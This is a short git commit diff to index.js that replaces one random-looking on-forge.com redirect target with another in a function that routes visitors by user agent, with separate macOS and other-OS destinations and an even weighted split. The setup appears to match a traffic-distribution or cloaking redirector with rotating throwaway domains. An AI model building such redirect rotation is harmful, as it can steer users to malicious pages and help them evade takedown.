cd1d98f48a34d197370b4548bf7cd0411dbcf929
animalinside <akshay.anand12@yahoo.com>
2026-05-05 08:36:07 +0530

    Update index.js

--- index.js
+++ index.js
@@ -46,14 +46,14 @@ function getResponse(userAgent) {
         {
             id: "Group 1",
             weight: 0.5,
-            macos: "https://askjfkldkdkd.on-forge.com/",
-            others: "https://askjfkldkdkd.on-forge.com/"
+            macos: "https://sfkgkdklkflkf.on-forge.com/",
+            others: "https://sfkgkdklkflkf.on-forge.com/"
         },
         {
             id: "Group 2",
             weight: 0.5,
-            macos: "https://askjfkldkdkd.on-forge.com/",
-            others: "https://askjfkldkdkd.on-forge.com/"
+            macos: "https://sfkgkdklkflkf.on-forge.com/",
+            others: "https://sfkgkdklkflkf.on-forge.com/"
         }
     ];
 
